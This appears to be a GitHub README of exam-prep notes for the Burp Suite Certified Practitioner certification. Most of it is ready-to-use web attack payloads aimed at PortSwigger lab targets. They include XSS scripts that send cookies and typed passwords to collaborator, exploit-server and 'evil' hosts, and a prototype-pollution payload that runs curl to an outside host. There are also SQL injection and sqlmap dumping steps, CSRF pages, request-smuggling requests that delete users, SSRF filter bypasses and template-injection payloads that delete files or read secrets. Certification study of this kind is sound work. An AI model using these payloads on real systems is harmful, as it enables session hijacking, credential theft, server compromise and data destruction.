# BSCP_Notes
Notes for Burp Suite Certified Practitioner

- The repository is for learning purpose only
- The payloads and attack patterns defined here should only be used in ethical way
- Make sure you use these notes as a guide only
- Try to make your own customized notes
- There are 4 xmind files which consist of exploit techniques, payloads, tips techniques for cracking the exam:
  - Advance Topics
  - Server-Side Vulnerabilities
  - Client-Side Vulnerabilities
  - Tools and payloads for the exam

## Authentication Bypassing

### 2FA Authentication bypass by relying on a single parameter to send the 2FA code.

With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the POST /login2 request, the verify parameter is used to determine which user's account is being accessed.
    Log out of your account.
    Send the GET /login2 request to Burp Repeater. Change the value of the verify parameter to carlos and send the request. This ensures that a temporary 2FA code is generated for Carlos.
    Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
    Send the POST /login2 request to Burp Intruder.
    In Burp Intruder, set the verify parameter to carlos and add a payload position to the mfa-code parameter. Brute-force the verification code.
    Load the 302 response in the browser.
    Click My account to solve the lab.


## XSS Paylodas for stealing cookies

### Exploits for stealing cookie via XSS
If you find these exploits as applicable, make sure to try with both:
- Exploit server
- COLLABORATOR  

### Using fetch method and defining the POST Method

`<script>
fetch('https://burpcollaborator.net', {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>`

### Using fetch method

`<script>
fetch('https://collaborator.net/?x='+document.cookie);
</script>`

### XSS Cookie Stealer payloads using JavaScript

`JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie`

### Reflected XSS into HTML context with nothing encoded in search.

`<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>`

### Reflected DOM XSS, into JSON data that is processed by eval().

`\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//`

### JavaScript Template literals are enclosed by backtick ( \` ) characters instead of double or single quotes.

`${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}`

### AngularJS DOM XSS Attack constructor payloads

`{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}``

### Web Cache Parameter cloaking - script /js/geolocate.js, executing the callback function setCountryCookie()

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//`

Or something like this:

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=fetch('https://fm5j9cc16vel2tzyiahicza4fvlm9db10.oastify.com/?secertcookie='+document.cookie)`
### More Cross-Site Scripting (XSS) example cookie stealer payloads.

`<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>`

### HTML  Tag, with invalid Image source, with escape sequence from source code calling window.location for the **LastViewedProduct cookie.

`&'><img src=1 onerror=print()>`
`&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>`
`<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>`

### Document.location returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.

```
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
Document.write

/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script>
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest();
                    req.onload = reqListener;
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true);
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>

<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  });
</script>
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

```

### OSCP Offsec PWK hand book cookie stealer example

`<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>`

### Alt Cookie Stealer

```
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Steal Password / Cookie Stealer ::::

#### XMLHttpRequest

```
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

#### FETCH API

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### DATA EXFILTRATION / COOKIE STEALER ::::

```
  </textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script>
<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>
<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
```

### IFRAMEs

```
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>
```

### Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.

`document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";`

### Prompt Validation payload, does not steal cookie or send it to exploit server.

`<img src=x onerror=prompt(1)>`

## Remote code execution via server-side prototype pollution

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```
## SQL Injection

### SQL Injection guessing the number of columns

Using order by, start by 1 and then keep on adding until you can an error, example for oracle based on input:
`'ORDER+BY+1--`

If order by does not work send null column names or random names, second example is work oracle as dual is a default table in oracle, modify the query based on the db type:
`'UNION+SELECT+NULL,NULL--`
`'UNION+SELECT+'cc','acc'+FROM+dual--`


Blind SQLInjection Payloads(also try first by including values after the ":
{"userId":"1 UNION SELECT 
CASE WHEN (target_case) THEN SLEEP(5) ELSE 0 END 
FROM users) --",



### TIme Based techniques:
 SELECT CASE WHEN ascii(substring(password,%s,1))=[CHAR] 
THEN SLEEP(5) ELSE 0 END from users where username=admin)--
### Getting table names

## In oracle based on number of columns getting table names
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

## In orables based on table names and number of columns getting column names
`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_QXLDOX'--`

## In Oracle based on number of columsn retrieving column data
`'+UNION+SELECT+PASSWORD_XWPKPI,USERNAME_QCONIL+FROM+USERS_QXLDOX--`

### SQLMAP workflow

In the dev Tools, copy the request you want to attack as curl and then paste it as the payloads like:

```
sqlmap -u '<copied data>'  -p <parameter you want to attack> --batch
```

Other useful commands to follow after getting some basic info, this flows from getting the database information, then getting table names, etc.
`--flush-session --dbms postgresql --technique E --level 5`

and now modify the command to dump out dbms: 
 `--dbms postgresql --technique E --level 5 --dbs`

  Now get the tables about the database: 

`--dbms postgresql --technique E --level 5 -D public --tables`

Now retrieve info about the users:
`--dbms postgresql --technique E --level 5 -D public --T users --dump`

## CSRF

### CSRF normal payload with parameters set

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <form id="csrfForm" action="https://vulnerable-website.com/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_account" value="attacker_account">
        <input type="hidden" name="_csrf" value="malicious_csrf_token">
    </form>
    <script>
        // Automatically submit the form when the page loads
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>`

### CSRF with header payload using xhr post request

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://vulnerable-website.com/transfer", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.setRequestHeader("X-Custom-Header", "<possible XSS attack vector>"); // Custom header set by attacker
        xhr.send("amount=1000&to_account=attacker_account&_csrf=malicious_csrf_token");
    </script>
</body>`

### CSRF with header payload using xhr get request

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://vulnerable-website.com/transfer?amount=1000&to_account=attacker_account&_csrf=malicious_csrf_token", true);
        xhr.setRequestHeader("X-Custom-Header", "custom_value"); // Custom header set by attacker
        xhr.send();
    </script>
</body>
</html>`


## Exam Payloads that you might have missed

There were http request smuggling findings plus xss through UA, something like this and then practicing this should have been useful

```
POST / HTTP/1.1
Host: 0a0100e303b540ff81ae1b90002500df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 225

0

GET /post?postId=2 HTTP/1.1
User-Agent: 6"/><script>fetch('https://0lm48xbm5gd61eyjhvg3bk9pegk78y3ms.oastify.com/?x='+document.cookie);</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

## CORS

### CORS Attack with XSS and trusted SUBDOMAIN

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...

The application responds with:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. there can be a possibility that the trsuted domain is itself vulnerable to xss, which can be used for XSS.
Observe that the productID parameter is vulnerable to XSS.

In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:
```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
Example: https://portswigger.net/web-security/cors/lab-breaking-https-attack


# HTTP Request Smuggling Testing Guide

This guide provides a comprehensive flow for testing various types of HTTP request smuggling vulnerabilities, including both HTTP/1.1 and HTTP/2 scenarios.

What can you do with it?
- smuggle a request through a normal request, which would be blocked under normal circumstances, that response will be queued and when you send any other request you will be served that responses
- If there is a reflected XSS, then you can use the second request to be in the queue and the response will be served to a user who visits the website next, you can use fetch payload to get cookie
- Again you can queue a response and if a user who has signed up will be served up their response, and their response which may contain cookie will be served up to you and then you can use that cookie, to sign in

## Flow Chart for Testing HTTP Request Smuggling

### 1. Start

### 2. Identify HTTP Version Used
- **Action**: Determine if the server is using HTTP/1.1 or HTTP/2.
- **Tools**: Burp Suite, Wireshark, browser developer tools.
- **Payloads**:
  - Check the server response headers to confirm the HTTP version.
  - Example 1 (HTTP/1.1):
```
    POST / HTTP/1.1
    Host: vulnerable-website.com
```
  - Example 2 (HTTP/2):
```
    GET / HTTP/2.0
    Host: vulnerable-website.com
```

### 3. Check for HTTP Request Smuggling Vulnerability
- **Action**: Test this only if HTTP /1.1downgrade was possible. Identify potential vulnerability to HTTP request smuggling if you cant downgrade following steps 5,6,7
- **Tools**: Burp Suite, manual HTTP request crafting.
- **Payloads**:
  - Example 1:
```
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 44
    Transfer-Encoding: chunked

    0

    GET / HTTP/1.1
    Host: vulnerable-website.com
```
  - Example 2:
```
    GET / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 12

    GET /malicious HTTP/1.1
    Host: vulnerable-website.com
```

### 4. Test for HTTP/1.1 Smuggling Types

#### TE.CL (Transfer-Encoding: chunked and Content-Length)
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 24
Connection: keep-alive

f
48luu=x&t0gj3=x
bd
POST /jf2yey3uzqxmd3le72y0xfszpqvnjd76bu1hr5g HTTP/1.1
Host: jf2yey3uzqxmd3le72y0xfszpqvnjd76bu1hr5g.oastify.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
Expected Behavior:

The server may process the GET /malicious request separately after processing the initial POST request.

Lab payload:

```
POST / HTTP/1.1
Host: 0a4900ca03eed89283a2417400f400f2.web-security-academy.net
Cookie: session=OoJmuFsfZgkgYTUfU4b28VzUMagYzDlh
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4
Connection: keep-alive

b9
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Cookie: session=OoJmuFsfZgkgYTUfU4b28VzUMagYzDlh
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### CL.TE (Content-Length and Transfer-Encoding: chunked)
Testing payload

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G

```


Expected Behavior:

The server may interpret the content length and transfer encoding inconsistently, leading to request smuggling.

Lab:

Testing if front end is CL and TE at the back end, you should get error in the second request:
```
POST / HTTP/1.1
Host: 0a7f00c7031f047d804d4e5f00540034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

x
```

Then testing more and eventually deleting the user carlos
```
POST / HTTP/1.1
Host: 0a7f00c7031f047d804d4e5f00540034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Transfer-Encoding: chunked

0

POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

x=1
```
Similar to the above scenario but you need cookie in the first request:
```
POST / HTTP/1.1
Host: 0a86002903006fa381fb5928002200c0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=RYtijcE8jZ7l4EeoWQrfQek4EyXFiIdD
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
### TE.TE (Transfer-Encoding: chunked twice)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0

GET /malicious HTTP/1.1
Host: vulnerable-website.com
```
Expected Behavior:

The server may incorrectly handle the repeated transfer encoding headers, resulting in request smuggling.

### 5. Test for HTTP/2 Smuggling Types

### H2.CL (HTTP/2 with Content-Length)

```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Content-Length: 13

GET /malicious HTTP/2.0
Host: attacker-website.com
```

Expected Behavior:

The server may misinterpret the Content-Length header and process the injected request separately.

### H2.TE (HTTP/2 with Transfer-Encoding)

```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net\r\n
\r\n
```
Expected Behavior:

The server may handle the Transfer-Encoding header incorrectly, leading to request smuggling.
If the repeated request gets you 404 that means that request was smuggled

In lab, you can try to smuggle /admin request and see if you get 200 and then try to perform actions accordingly or in real scenario try to retrieve a cookie:
```
POST / HTTP/2
Host: 0a320035044e1bd481e452f1009b0072.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0a320035044e1bd481e452f1009b0072.web-security-academy.net


```

### H2.CL

H2.CL request smuggling: The lab is vulnerable to front end downgrade, this time we will use CL for the downgrade, and provide an ambigious CL length, to perform the attack we will need to exploit the user by redirecting them to an exploit page which causes javascript to execute and cause an alert popup, we will need to first find a request that is redirecting the user just based on that request and adding the host header initially, this will be /resources. if we send a request to the app with any host header and with /resources it will just append to the host header for redirect, we can use our exploit server for this and then save the exploit under /resources. Final pyalod:
```
POST / HTTP/2
Host: 0a93009b037290338009cb7e001b00e6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0ac80049032f90ff8073ca6e018d00dd.exploit-server.net
Content-Length: 5

x=1
```
Make sure you dont include /r/n in the final line so that next header is appended to it from the user.

### CL.0

Similar to above scenario but you smuggle the request with proper content length only and then
with payload, it can be found through the auto scanner
Example to delete the user carlos:

```
GET /resources/labheader/js/labHeader.js HTTP/2
Host: 0a9b0064031c4edf83f2a60a000e0067.web-security-academy.net
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Cache-Control: max-age=0
Cookie: session=EbAnLZFZvgWw44sm6uAgycRJXYaI3gzu
Upgrade-Insecure-Requests: 1
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"
Sec-Ch-Ua-Platform: Windows
Sec-Ch-Ua-Mobile: ?0
Content-Length: 27

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

### 6. Test for HTTP/2 Request Smuggling via CRLF Injection
Testing:
```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Content-Length: 13
X-Injected-Header: value\r\nTransfer-Encoding: chunked

0

SMUGGLED
```
```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Content-Length: 13
X-Injected-Header: value\r\nTransfer-Encoding: chunked

0

malicious request
```

### 7. Test for HTTP/2 Request Splitting via CRLF Injection

```
GET /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
User-Agent: legitimate-user-agent
X-Injected-Header: value\r\nGET /malicious HTTP/2.0\r\nHost: attacker-website.com\r\n\r\n
```

Expected Behavior:

The server may split the request and process the injected GET /malicious HTTP/2.0 as a separate request.

### 8. Observe Server Responses

Monitor for signs of smuggling:
Split requests
Delayed responses
Unexpected responses using Burp Suite, server logs, and HTTP response analysis.

### 9. Confirm Exploitable Vulnerabilities

Verify if the observed behavior can be exploited using various payloads to determine the extent of the vulnerability.


## CORS

CORS vulnerabilities can help you get cookies, access tokens, and other information etc.
Try this on stage 1 or stage 2 of the exam.

For testing for CORS misconfiguration check if CORS headers are returned or not and what do they say:

Access-Control-Allow-Origin: <value>
Access-Control-Allow-Credentials: <value true or false>

Sometimes the orignin value will be just reflected in the Access control headers.

Example Scenario:

Send the request to Burp Repeater, and resubmit it with the added header:
Origin: https://example.com
Observe that the origin is reflected in the Access-Control-Allow-Origin header.

Payload for lab to get access keys, once you know that credentials will be shared by the
CORS

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
Similarly if null origin is reflected then you can get the user to navigate from top level navigation, code

```


<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>fetch(https://0ac6001b04623a9b86df3226003200e1.web-security-academy.net/accountDetails`, { credentials: 'include', method: 'GET' }).then(response=> response.json()).then(data => { fetch(/?apiKey=${data.apikey}, { mode: 'no-cors' }) }) </script>"></iframe>
```

Check if there is subdomain using tls or not which is vulnerable to XSS, and then see if you can try to retrieve information from there, payload example:
```
<script>document.location="http://stock.0a5900f103e3b1a680423a8c006c0004.web-security-academy.net/?productId=4<script>var+req=+new+XMLHttpRequest();req.onload=reqListener;req.open('get','https://0a5900f103e3b1a680423a8c006c0004.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();function+reqListener()+{location='https://exploit-0ac300320399b1fa80e439d9018e002a.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
</script>
```

## HTTP Host header attacks

These types of attacks can be used to escalate privilege or try to bypass authentication, and can be used in stage1 or stage2 of the exam.

Most of these findings are found through auotmatic scanner, then you will need to work on exploit, the details will be like External Service Interaction(HTTP), Out of Band resource load(HTTP).

## Approach
The best place, where you can set this type of attacks is in **Forgot password?** functionality.  
![image](https://user-images.githubusercontent.com/58632878/225040952-cf621879-c6e9-4b9d-aac8-b1b3c3d95bf4.png)  

Set your exploit server in Host and change username to victim's one:  
![image](https://user-images.githubusercontent.com/58632878/225041836-87faa37d-39f9-48c5-910f-aed9be30f63a.png)  

Go to exploit server logs and find victim's forgot-password-token:  
![image](https://user-images.githubusercontent.com/58632878/225043063-d2db3e7a-f23d-40cb-955e-76e282be65f1.png)  

These Headers can also be used, when **Host** does not work:
```
X-Forwarded-Host: exploit-server.com
X-Host: exploit-server.com
X-Forwarded-Server: exploit-server.com
```
## Techniques where host header can be injected:
### Duplicate Headers

```
Host: vulnerable-website.com
Host: bad-stuff-here
```

### Supply absolute URL

```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

### Adding a line wrapper

```
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```

### Inject host override headers

Example:
```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here
```
Other such header are:
```

    X-Host
    X-Forwarded-Server
    X-HTTP-Host-Override
    Forwarded
```

## Labs
### 1. To send malicious email put your server in Host
```
Host: exploit-server.com
```
>https://hackerone.com/reports/698416

### 2. Admin panel from localhost only
```
GET /admin HTTP/1.1
Host: localhost
```

### 3. Double Host / Cache poisoning
```
Host: 0adf00cc033d5f09c05b077d000200eb.web-security-academy.net
Host: "></script><script>alert(document.cookie)</script>
```
>https://hackerone.com/reports/123513

### 4. SSRF
```
GET /admin HTTP/1.1
Host: 192.168.0.170
```

### 5. SSRF
```
GET https://0a44007e03fb1d0cc0068900005000d1.web-security-academy.net HTTP/1.1
Host: 192.168.0.170
```

### 6. Dangling markup
```
Host: 0a42005f03d221bec0c45997001600ce.web-security-academy.net:'<a href="http://burp-collaborator.com?
```
>https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
"

### 7. Sequential testing


Send the GET / request to Burp Repeater.

Make the following adjustments:

    Change the path to /admin.

    Change Host header to 192.168.0.1.

Send the request. Observe that you are simply redirected to the homepage.

Duplicate the tab, then add both tabs to a new group.

Select the first tab and make the following adjustments:

    Change the path back to /.

    Change the Host header back to YOUR-LAB-ID.h1-web-security-academy.net.

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).

Change the Connection header to keep-alive.

Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.

## Server-side request forgery (SSRF)
This can help you in stage 1 and stage 2 mostly.
Most of the times burp automatically detects this with scanner, with findings saying like external resource access, out of band resource load and sometimes, there will be an open redirect vulnerability.

## Approach
One of my favorites, quite easy to understand.  
**ATTENTION:** If you find an SSRF vulnerability on exam, you can use it to read the files by accessing an internal-only service running on localhost on port 6566.  

In addition to lab cases, I've got some other useful techniques about this type:  
SSRF Bypass:
```
▶️Type in http://2130706433 instead of http://127.0.0.1
▶️Hex Encoding 127.0.0.1 translates to 0x7f.0x0.0x0.0x1
▶️Octal Encoding 127.0.0.1 translates to 0177.0.0.01
▶️Mixed Encoding 127.0.0.1 translates to 0177.0.0.0x1

https://h.43z.one/ipconverter/
```
![image](https://user-images.githubusercontent.com/58632878/224699478-48309584-4c49-4c06-9714-5d19a245df72.png)  

>**Like XML, the place to find SSRF is at /product/stock check.**  

![da](https://user-images.githubusercontent.com/58632878/224700641-25eaaaea-c69c-48ca-8d5a-92c2d197963a.png)  

>**There is also another place for SSRF, but it will be covered in [HTTP Host header attacks](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-host-header-attacks).**

## Labs
### 1. Basic SSRF against another back-end system
>Need to scan internal network to find IP with 8080 port:
```
stockApi=http://192.168.0.34:8080/admin
```

### 2. SSRF with blacklist-based input filter
```
stockApi=http://127.1/AdMiN/
```

### 3. SSRF with filter bypass via open redirection vulnerability
```
stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin
```

### 4. Blind SSRF with out-of-band detection
```
Referer: http://burpcollaborator
```

### 5. SSRF with whitelist-based input filter
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/
```

### 6. Admin panel - Download report as PDF SSRF  
![image](https://user-images.githubusercontent.com/58632878/225074847-8daa2242-a99d-423f-888e-111755f04d9c.png)  
```
<iframe src='http://localhost:6566/secret' height='500' width='500'>
```
>https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/  

## Server Side Template Injection(SSTI)

Look for error messages received when you click on items, etc, it may reveal that there is some template being used, targeted scanner is a good approach to find these vulnerabilities quickly.
This may not be easily found by automated scanner.
This maybe used for stage1 or 2, but primarily for stage3
## Approach

Look for a a parameter that is rendering directly to the page. Look for templates if you have admin access to edit the templates of a page

    ERB: <%= %>
    Tornado: ""}}{% import os %}{{os.system("rm /home/carlos/morale.txt")
    Jinja2: Use {% debug %} to gather information, targeting setting.SECRET_KEY
    See https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection for more information
    Login with content-manager:C0nt3ntM4n4g3r.


Complexity can only arise when searching for the language in which the code was written, for this I used a small tip to narrow the range of technologies: at the exploration stage, we iterate over template expressions ```({{7*7}}, ${7*7},<% = 7*7 %>, ${{7*7}}, #{7*7}, *{7*7})``` and if, for example, we got the expression ```<%= 7*7 %>``` go to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and look for all technologies that use this expression. The method, of course, has a big crack in the form of the most common expression ```{{7*7}}```, here only God can tell you what kind of technology it is. Again, do not hesitate to scan with Burp, maybe it can tell you what technology is used.  

Arises at View Details with reflected phrase **Unfortunately this product is out of stock**  
![aa](https://user-images.githubusercontent.com/58632878/224709631-b1b0555f-5ee6-44a9-a98a-0244ebead621.png)  

## Labs
### 1. Basic server-side template injection
>Ruby
```
<%= system("rm+morale.txt") %>
```

### 2. Basic server-side template injection (code context)
```
blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}
```

### 3. Server-side template injection using documentation
>Java Freemaker
```
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```

### 4. Server-side template injection in an unknown language with a documented exploit
>NodeJS Handlebars exploit
>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs


### 5. Server-side template injection with information disclosure via user-supplied objects
>Python Jinja2
```
{{settings.SECRET_KEY}}
```


### 6. Admin panel Password Reset Email SSTI
>Jinja2  

![image](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)  
```
newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
&csrf=csrf
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2


**Get access to any user**  
[XSS](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#xss)  
[DOM-based vulnerabilities](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#dom-based-vulnerabilities)  
[Authentication](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#authentication)  
[Web cache poisoning](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#web-cache-poisoning)  
[HTTP Host header attacks](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-host-header-attacks)  
[HTTP request smuggling](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-request-smuggling)  


**Promote yourself to an administrator or steal his data**  
[SQL Injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#sql-injection)  
[Cross-site request forgery (CSRF)](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#cross-site-request-forgery-csrf)  
[Insecure deserialization](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#insecure-deserialization) (Modifying serialized data types)  
[OAuth authentication](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#oauth-authentication)  
[JWT](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#jwt)  
[Access control vulnerabilities](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#access-control-vulnerabilities)  


**Read the content of /home/carlos/secret**  
[Server-side request forgery (SSRF)](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#server-side-request-forgery-ssrf)  
[XML external entity (XXE) injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#xml-external-entity-xxe-injection)  
[OS command injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#os-command-injection)  
[Server-side template injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#server-side-template-injection)  
[Directory traversal](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#directory-traversal)  
[Insecure deserialization](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#insecure-deserialization)  
